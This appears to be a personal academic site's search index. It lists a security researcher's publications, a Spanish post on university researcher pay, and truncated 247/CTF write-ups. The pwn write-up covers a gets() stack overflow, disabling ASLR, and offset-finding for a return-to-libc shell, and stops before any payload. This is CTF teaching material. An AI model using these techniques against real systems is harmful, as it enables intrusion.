[{"authors":null,"categories":null,"content":"I am a PhD Student in Computer Science at RME, a part of the Distributed Computing research group (DisCo) from Universidad de Zaragoza (Spain) focused on software and systems security; where I am under the supervision of Prof. Ricardo J. Rodríguez, and funded by the Gobierno de Aragón.\nI obtained my bachelor’s degree in Computer Science at Universidad de Zaragoza and my master’s degree in Research in Cyber Security at Universidad de León (Spain). Previously, I worked as a Research Assistant at Universidad de Zaragoza and as a Malware Analyst at S21Sec.\n","date":1664582400,"expirydate":-62135596800,"kind":"term","lang":"en","lastmod":1679270400,"objectID":"2525497d367e79493fd32b198b28f040","permalink":"","publishdate":"0001-01-01T00:00:00Z","relpermalink":"","section":"authors","summary":"I am a PhD Student in Computer Science at RME, a part of the Distributed Computing research group (DisCo) from Universidad de Zaragoza (Spain) focused on software and systems security; where I am under the supervision of Prof.","tags":null,"title":"Daniel Uroz","type":"authors"},{"authors":["Daniel Uroz","Ricardo J. Rodríguez"],"categories":null,"content":" ","date":1664582400,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1664582400,"objectID":"ddfa177bdaab507577ab8ce80fa81104","permalink":"https://duroz.github.io/publication/2022-jiot-uroz-r/","publishdate":"2022-09-26T00:00:00Z","relpermalink":"/publication/2022-jiot-uroz-r/","section":"publication","summary":"We review the suitability of CoAP 1.0; MQTT 3.1.1 and 5.0; and AMQP 1.0 protocols for exfiltrating data. For each protocol, we review its specification and calculate the overhead and available space to exfiltrate data in each protocol message","tags":["AMQP 1.0","CoAP 1.0","Data Exfiltration","IoT Protocols","MQTT 3.1.1","MQTT 5.0"],"title":"Characterization and Evaluation of IoT Protocols for Data Exfiltration","type":"publication"},{"authors":["Daniel Uroz"],"categories":["Academic"],"content":"ACTUALIZACIÓN 20/03/2023: la Universidad de Zaragoza ha decidido ser menos transparente y ahora las tablas salariales son “““públicas”””, solamente puedes acceder a ellas si tienes una cuenta de correo electrónico de la universidad.\n–\nEsta vez vamos a hablar de una de las peores facetas de trabajar como investigador para la universidad pública española: temporalidad, precariedad, incertidumbre, inestabilidad, burocracia, falta de financiación, endogamia, amiguismo, envejecimiento de la plantilla, desactualización, falta de transparencia sueldo. Vamos a ir calculando qué sueldo neto mensual obtienen las distintas figuras del investigador (lo que tú realmente ves ingresado en el banco), desde recién graduados hasta doctorandos. Salvo que se indique lo contrario, todos los sueldos que veamos corresponden a trabajadores de la Universidad de Zaragoza con una dedicación a Tiempo Completo (TC).\nAunque todos los sueldos tratados son públicos, a veces no nos hacemos a la idea de cuánto dinero vamos a obtener a final de mes para saber si esta vida profesional nos interesa y, sobre todo, qué sueldo vamos a cobrar a medida que cumplamos años. Esta recopilación va dirigida principalmente a aquellos estudiantes que tienen su primer contacto laboral a través de la Universidad, así que solamente veremos los puestos más bajos (los que no requieren un doctorado).\nDISCLAIMER: todos los sueldos netos son transcipciones de mis nóminas o las de conocidos. Las cifras aquí presentadas pueden variar ligeramente en función de la situación de cada uno.\nTL;DR\nFigura Requisitos Rango edad Sueldo neto mensual Nº pagas Investigador Novel (N4) Grado 22-24 años 883 € 14 Investigador Iniciado (N3) Grado, Máster 23-26 años 986 € 14 Investigador Iniciado (N3.1) Grado, Máster, 2 años investigando 25 años hasta doctorarse 1269 € 14 Beca predoctoral DGA Grado, Máster, ganar una convocatoria pública 23-27 años 1191 € 12 Investigador Novel (N4) A todo el mundo nos hace ilusión nuestro primer trabajo. Y el Investigador Novel (N4), en adelante simplemente N4, es el primer tipo de contrato que ofrecen a un recién graduado en la Universidad. Todos los sueldos de investigador son públicos, y se asignan según los estudios que tengas. En el caso de un N4, si consultamos su sueldo en la página de la Vigerencia de Investigación, nos encontramos con una tabla en la que aparece la bonita cifra de 19 676,37 €.\nJoder, 19 676,37 € de sueldo bruto anual como primer trabajo de un recién graduado en España es (desgraciadamente) un buen sueldo. ¿De qué se queja este chico? Pues de que esta cifra es lo que le cuesta a tu jefe contratarte. Si te fijas dos filas más arriba verás exactamente qué te están ofreciendo cuando te quieren contratar como un N4, 14 343,69 € brutos anuales. Para poner esta cifra en perspectiva, el Salario Mínimo Interprofesional (SMI) en España para este 2021 es de 13 300 € brutos anuales.\nEste tipo de contrato es en 14 pagas, por lo que a final de mes recibirás un sueldo neto de 883 €. Calcular los rangos de edad es muy dependiente de la situación de cada uno, pero partiendo de la situación idílica de que pudiste empezar el Grado a los 18 años y que te graduaste en los años que te tocaban, trabajarías en este puesto desde los 22 años hasta que obtengas un máster. Dependiendo de los créditos del máster que elijas, puedes ser N4 desde los 22 años hasta los 23 años (60 ECTS de Máster), 23,5 años (90 ECTS) o 24 años (120 ECTS).\nUna situación típica es que te ofrezcan un puesto de N4 con dedicación a Tiempo Parcial (TP) mientras te estás sacando el Máster. En este caso, seguimos hablando de un sueldo en 14 pagas, pero esta vez se establece el sueldo neto mensual en 454 €.\nInvestigador Iniciado (N3) El puesto de Investigador Iniciado (N3) se otorga a aquel trabajador que tiene un máster, independientemente de si ha investigado con anterioridad o no. Cosas de la vida. Si buscamos su sueldo público, veremos que el sueldo bruto anual es de 15 647,53 € en 14 pagas, por lo que recibirás un sueldo neto mensual de 986 €. ¡Casi casi mileurista!\nSuponiendo que has optado por la vía más corta para obtener un máster, trabajarás de N3 desde los 23 años hasta los 25 años, momento en el que habrás conseguido los dos años de experiencia que piden para el siguiente rango, Investigador Iniciado (N3.1).\nInvestigador Iniciado (N3.1) Para que te contraten como Investigador Iniciado (N3.1), aparte de las ganas de tu jefe para que le consumas 27 000 € de un proyecto, necesitas un máster y 2 años de experiencia investigadora. En este caso, el sueldo bruto anual es de 20 610,87 €, el cual empieza a acercarse a una cifra aceptable, y solamente habrás necesitado sacarte un grado, un máster, y haber trabajado 2 años de investigador. Con este puesto, tu sueldo neto mensual es de 1269 € en 14 pagas.\nSuponiendo que te has sacado tanto el grado como el máster (de 60 ECTS) seguidos y a la primera, estarás en este puesto desde los 25 años hasta que te doctores. Aunque no suele ser …","date":1624579200,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1679270400,"objectID":"a0e90fce704a0e8b097ffa81e8383136","permalink":"https://duroz.github.io/post/sueldo-investigador/","publishdate":"2021-06-25T00:00:00Z","relpermalink":"/post/sueldo-investigador/","section":"post","summary":"Vamos a ver cuánto gana un investigador en la Universidad de Zaragoza en los puestos que no requieren un doctorado, cuáles son los requisitos del puesto y a qué edad, presumiblemente, se suele acceder a cada puesto.","tags":["Academic Life"],"title":"¿Cuál es el sueldo de un investigador en la Universidad?","type":"post"},{"authors":["Daniel Uroz","Ricardo J. Rodríguez"],"categories":null,"content":" ","date":1619827200,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1619827200,"objectID":"72e38bff020fc515780be58c704dffb3","permalink":"https://duroz.github.io/publication/2021-woot-uroz-r/","publishdate":"2021-05-01T00:00:00Z","relpermalink":"/publication/2021-woot-uroz-r/","section":"publication","summary":"We define a virtual language, dubbed ROPLang, that defines a set of operations (specifically, arithmetic, assignment, dereference, logical, and branching operations) which are mapped to ROP gadgets. We then use it to evaluate the executional power of an adversary in Windows 7 and Windows 10, in both 32- and 64-bit versions","tags":["ROP Chain","Evaluation","Turing-completeness","Windows","Automatic Exploit"],"title":"Evaluation of the Executional Power in Windows using Return Oriented Programming","type":"publication"},{"authors":["Daniel Uroz"],"categories":["CTF"],"content":"In this post, we’ll cover how to exploit a stack-based buffer overflow, this time with the stack marked as non executable. We firstly detail how to manually exploit the binary locally and, after that, in the remote server. At the end, we’ll use the Python library pwntools to speed up exploit development.\nChallenge This time, 247/CTF give us a binary called non_executable_stack with the following description:\nThere are no hidden flag functions in this binary. Can you make your own without executing from the stack?\nAnd here is an example of execution flow:\n$ ./non_executable_stack Enter the secret password: kk Incorrect secret password! It’s a ELF 32-bit as previous pwn challenges, but this time with NX bit enable to make stack segment (and any other) writable but not executable:\n$ checksec non_executable_stack [*] \u0026#39;/home/urzu/247ctf/pwn/non_executable_stack\u0026#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) This checksec version is the one coming with pwntools (you can install it with python3 -m pip install pwntools), there is also a Bash script with the same functionality.\nBackground If we analyze the binary, we can quickly spot the use of gets function to retrieve the password, so we can overflow the buffer due to no outbounds checking of the function:\n$ r2 non_executable_stack -- Virtual machines are great, but you lose the ability to kick the hardware. [0x080483c0]\u0026gt; aa [x] Analyze all flags starting with sym. and entry0 (aa) [0x080483c0]\u0026gt; s sym.chall [0x080484d6]\u0026gt; pdf ; CALL XREF from main @ 0x804857f ┌ 103: sym.chall (); │ ; var int32_t var_28h @ ebp-0x28 │ ; var int32_t var_4h @ ebp-0x4 │ 0x080484d6 55 push ebp │ 0x080484d7 89e5 mov ebp, esp │ 0x080484d9 53 push ebx │ 0x080484da 83ec24 sub esp, 0x24 [... redacted ...] │ 0x080484eb 8d45d8 lea eax, [var_28h] │ 0x080484ee 50 push eax │ 0x080484ef e88cfeffff call sym.imp.gets ; char *gets(char *s) \u0026lt;--- buffer overflow [... redacted ...] │ │ 0x08048528 8d833de6ffff lea eax, [ebx - 0x19c3] │ │ 0x0804852e 50 push eax │ │ 0x0804852f e85cfeffff call sym.imp.puts ; int puts(const char *s) │ │ 0x08048534 83c410 add esp, 0x10 │ │ ; CODE XREF from sym.chall @ 0x8048523 │ └──\u0026gt; 0x08048537 90 nop │ 0x08048538 8b5dfc mov ebx, dword [var_4h] │ 0x0804853b c9 leave └ 0x0804853c c3 ret [0x080484d6]\u0026gt; This problem is that, whereas in previous challenges we could execute our payload directly into the stack, this time NX bit is preventing us to do so. Still, we can overwrite the return based stored in the stack to control the program flow, so why don’t use the code already residing in executable segments to our purpose? This is the main idea behind Return-to-libc attack and Return-oriented programming.\nReturn-to-libc This attack relies of using code marked as executable contained in libc shared library. libc provides a runtime environment to C programs, so it usually loaded into the memory of most processes. In this binary, we can see that it will effectively be loaded thanks to:\n$ ldd non_executable_stack linux-gate.so.1 (0xf7fd2000) libc.so.6 =\u0026gt; /lib32/libc.so.6 (0xf7dd4000) /lib/ld-linux.so.2 (0xf7fd4000) libc provides a lot of functions like printf, scanf, fopen and so on. Thus, if we can execute system function (which execute a shell command) with /bin/sh parameter, we’ll be able to prompt an interactive shell.\nLocal exploit We’re going to develop a local version of the exploit and, in order to make it easier, we’re going to deactivate ASLR protection of our system:\n$ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space 0 Firstly, we can obtain the necessary padding to overwrite the return address placing a breakpoint just before the ret instruction (0x0804853c in the code above) and seeing where is our input:\n$ r2 -d non_executable_stack Process with PID 2381 started... = attach 2381 2381 bin.baddr 0x08048000 Using 0x8048000 asm.bits 32 glibc.fc_offset = 0x00148 -- Most likely your core dump fell into a blackhole, can\u0026#39;t see it. [0xf7fd50b0]\u0026gt; aa [x] Analyze all flags starting with sym. and entry0 (aa) [0xf7fd50b0]\u0026gt; db 0x0804853c [0xf7fd50b0]\u0026gt; dc Enter the secret password: kk Incorrect secret password! hit breakpoint at: 804853c [0x0804853c]\u0026gt; px -0x2c @ esp - offset - 0 1 2 3 4 5 6 7 8 9 A B C D E F 0123456789ABCDEF 0xffffd1d0 6b6b 00ff 9096 fef7 90f8 faf7 00a0 0408 kk.............. 0xffffd1e0 00e0 faf7 00e0 faf7 08d2 ffff 7c85 0408 ............|... 0xffffd1f0 5886 0408 00a0 0408 08d2 ffff X........... [0x0804853c]\u0026gt; Our input starts 0x2c before, so this is the amount of padding we need to provide and, then, the return address of the function we want to execute (system in this case). In addition, thanks to deactivating ASLR, libc will be loaded in the same base address during multiple executions (0xf7dd4000 in the example):\n[0x0804853c]\u0026gt; dmm 0x08048000 0x08049000 /home/urzu/247ctf/pwn/non_executable_stack 0xf7dd4000 0xf7ded000 /usr/lib32/libc-2.28.so 0xf7fd4000 0xf7fd5000 /usr/lib32/ld-2.28.so [0x0804853c]\u0026gt; ood …","date":1591574400,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1651190400,"objectID":"9efbb0799384c0a7f0727e7c22bc03bc","permalink":"https://duroz.github.io/post/247ctf-pwn-non-executable-stack/","publishdate":"2020-06-08T00:00:00Z","relpermalink":"/post/247ctf-pwn-non-executable-stack/","section":"post","summary":"We'll cover how to exploit a stack-based buffer overflow, this time with the stack marked as non executable. We firstly detail how to manually exploit the binary locally and, after that, in the remote server. At the end, we'll use the Python library pwntools to speed up exploit development.","tags":["CTF","Writeup","247/CTF","pwn"],"title":"247/CTF - pwn - Non Executable Stack","type":"post"},{"authors":["Daniel Uroz"],"categories":["CTF"],"content":"Hi all! This is my first blog post ever, I’ll try to write every post self-explanatory and explain every detail involved. This time is about the third challenge of cryptography of the platform 247/CTF.\nChallenge description We’re given an exclusive_key file with the following description:\nWe XOR encrypted this file, but forgot to save the password. Can you recover the password for us and find the flag?\nAt first sight, we can’t see any repetition, so it seems there is no clue about what xor key was used for encryption:\n$ md5sum exclusive_key e1078ca347364828a43a40bd55c937f2 exclusive_key $ xxd exclusive_key | head 00000000: 0e15 730c 1712 2233 2718 5a15 5f5d 5c68 ..s...\u0026#34;3\u0026#39;.Z._]\\h 00000010: 050b 405b 5914 065d 5846 400b 4100 090a ..@[Y..]XF@.A... 00000020: 570c 4015 085b 5d0e 1014 5b22 3a21 4641 W.@..[]...[\u0026#34;:!FA 00000030: 0756 1041 5658 105f 1b0f 4044 170a 6f0d .V.AVX._..@D..o. 00000040: 5150 5252 5d69 590e 5716 5518 055c 560f QPRR]iY.W.U..\\V. 00000050: 4151 437e 7613 2f25 4f00 104e 0c3b 5e16 AQC~v./%O..N.;^. 00000060: 5017 5853 0b7c 0452 5250 4116 4e43 320a P.XS.|.RRPA.NC2. 00000070: 590b 445d 025d 5641 1d40 5e37 3823 4569 Y.D].]VA.@^78#Ei 00000080: 5e4b 5113 5b41 165c 5d0c 5743 5851 0b45 ^KQ.[A.\\].WCXQ.E 00000090: 1751 5c55 160e 000d 4627 585d 0b51 5909 .Q\\U....F\u0026#39;X].QY. Solution If we Google a bit, we encounter an amazing tool to analyze multi-byte xor cipher called xortool able to:\nguess the key length (based on count of equal chars) guess the key (base on knowledge of most frequent char) If we run the tool with default settings, it outputs the following results:\n$ xortool exclusive_key The most probable key lengths: 2: 13.4% 4: 13.7% 8: 13.4% 10: 11.9% 12: 9.4% 16: 9.1% 18: 6.4% 20: 9.4% 24: 6.5% 40: 7.0% Key-length can be 4*n Most possible char is needed to guess the key! Well, better than nothing. We can specify the most possible character with -c option, usually is 0x00 (null-byte) for binary data and 0x20 (whitespace) for text data. If we try either of the two, we obtain a similar result:\n$ xortool exclusive_key -c \u0026#34;0x00\u0026#34; The most probable key lengths: 2: 13.4% 4: 13.7% 8: 13.4% 10: 11.9% 12: 9.4% 16: 9.1% 18: 6.4% 20: 9.4% 24: 6.5% 40: 7.0% Key-length can be 4*n 1 possible key(s) of length 4: \u0026#39;\\\\][_ Found 0 plaintexts with 95%+ valid characters See files filename-key.csv, filename-char_used-perc_valid.csv The tool will create the folder xortool_out with three files in this case:\n0.out: decrypted file with guessed xor key. filename-char_used-perc_valid.csv: list of most frequent char used for every file (in case of many) and percentage of valid characters in the decrypted file. filename-key.csv: list of key used for every file. Unfortunately, the resulting file doesn’t seem to have been decrypted right:\n$ xxd xortool_out/0.out | head 00000000: 5248 2853 4b4f 796c 7b45 014a 0300 0737 RH(SKOyl{E.J...7 00000010: 5956 1b04 0549 5d02 041b 1b54 1d5d 5255 YV...I]....T.]RU 00000020: 0b51 1b4a 5406 0651 4c49 007d 667c 1d1e .Q.JT..QLI.}f|.. 00000030: 5b0b 4b1e 0a05 4b00 4752 1b1b 4b57 3452 [.K...K.GR..KW4R 00000040: 0d0d 090d 0134 0251 0b4b 0e47 5901 0d50 .....4.Q.K.GY..P 00000050: 1d0c 1821 2a4e 747a 135d 4b11 5066 0549 ...!*Ntz.]K.Pf.I 00000060: 0c4a 030c 5721 5f0d 0e0d 1a49 121e 6955 .J..W!_....I..iU 00000070: 0556 1f02 5e00 0d1e 411d 0568 647e 1e36 .V..^...A..hd~.6 00000080: 0216 0a4c 071c 4d03 0151 0c1c 040c 501a ...L..M..Q....P. 00000090: 4b0c 070a 4a53 5b52 1a7a 0302 570c 0256 K...JS[R.z..W..V So, we can try to bruteforce the key. The tools counts with -b option to brute force all possible most frequent chars, or -o to constraint search to printable chars. If we try to run either of two options, we get a bunch of files with no sense at all. But, if we use -m option to specify a longer key, we obtain a more promising result:\n$ xortool exclusive_key -o -m 256 The most probable key lengths: 2: 9.5% 4: 10.2% 8: 11.4% 10: 10.8% 12: 9.1% 16: 9.9% 20: 11.3% 24: 8.5% 30: 7.5% 40: 11.8% Key-length can be 4*n 100 possible key(s) of length 40: \u0026#39;gab\\x16\\x01\\x13.67mg4kd77l:ac`a0dl`#c6606gram3ab( \u0026#39;f`c\\x17\\x00\\x12/76lf5je66m;`ba`1ema\u0026#34;b7717fs`l2`c) \u0026#39;ec`\\x14\\x03\\x11,45oe6if55n8cabc2fnb!a4424epco1c`* \u0026#39;dba\\x15\\x02\\x10-54nd7hg44o9b`cb3goc `5535dqbn0ba+ \u0026#34;cef\\x12\\x05\\x17*23ic0o`33h\u0026gt;egde4`hd\u0026#39;g2242cvei7ef, ... Found 35 plaintexts with 95%+ valid characters See files filename-key.csv, filename-char_used-perc_valid.csv 35 plaintext! If we carefully examine the 99 resulting files, we can spot an almost decrypted HTML file of Wikipedia’s hacker entry in 14.out file:\n$ xxd xortool_out/14.out | head 00000000: 3c21 444f 4354 5950 4520 6874 616c 3e0a \u0026lt;!DOCTYPE htal\u0026gt;. 00000010: 3c64 746d 6c20 636c 6173 363d 2263 6c69 \u0026lt;dtml clas6=\u0026#34;cli 00000020: 652b 742d 6e6f 6a73 2220 6c61 6e67 3d22 e+t-nojs\u0026#34; lang=\u0026#34; 00000030: 656e 2220 6869 723d 2260 7472 223e 0a3c en\u0026#34; hir=\u0026#34;`tr\u0026#34;\u0026gt;.\u0026lt; 00000040: 6865 2464 3e0a 3c6d 6531 6120 6368 6172 he$d\u0026gt;.\u0026lt;me1a char 00000050: 7365 743d 2255 5446 2d38 222f 320a 3c74 set=\u0026#34;UTF-8\u0026#34;/2.\u0026lt;t 00000060: 6978 6c65 3e48 6163 6b65 3720 …","date":1589846400,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1651190400,"objectID":"9b92d4e37bc6e473bd1ef0f393da90a4","permalink":"https://duroz.github.io/post/247ctf-crypto-exclusive-key/","publishdate":"2020-05-19T00:00:00Z","relpermalink":"/post/247ctf-crypto-exclusive-key/","section":"post","summary":"We are going to solve the third cryptography challenge of the 247/CTF platform.","tags":["CTF","Writeup","247/CTF","Crypto"],"title":"247/CTF - Crypto - An Exclusive Key","type":"post"},{"authors":["Daniel Uroz","Ricardo J. Rodríguez"],"categories":null,"content":" ","date":1585699200,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1585699200,"objectID":"fcda0b12bcc96ac479030809fbe99dc5","permalink":"https://duroz.github.io/publication/2020-fsidi-uroz-r/","publishdate":"2020-04-01T00:00:00Z","relpermalink":"/publication/2020-fsidi-uroz-r/","section":"publication","summary":"We investigate the limitations that memory forensics imposed to the digital signature verification process of Windows PE signed files, obtained from a memory dump","tags":["Memory Forensics","Authenticode","Digital Signature Verification","Code Signing","Volatility"],"title":"On Challenges in Verifying Trusted Executable Files in Memory Forensics","type":"publication"},{"authors":["Daniel Uroz","Ricardo J. Rodríguez"],"categories":null,"content":" ","date":1554076800,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1554076800,"objectID":"a04d096a3b888ddc2e3fde44ef2f7efd","permalink":"https://duroz.github.io/publication/2019-diin-uroz-r/","publishdate":"2019-04-01T00:00:00Z","relpermalink":"/publication/2019-diin-uroz-r/","section":"publication","summary":"We propose a taxonomy of the Windows ASEPs, considering the features that are used or abused by malware to achieve persistence.","tags":["Memory Forensics","System Persistence","Malware","Auto-start Extensibility Points","Windows Registry","Volatility"],"title":"Characteristics and Detectability of Windows Auto-Start Extensibility Points in Memory Forensics","type":"publication"}]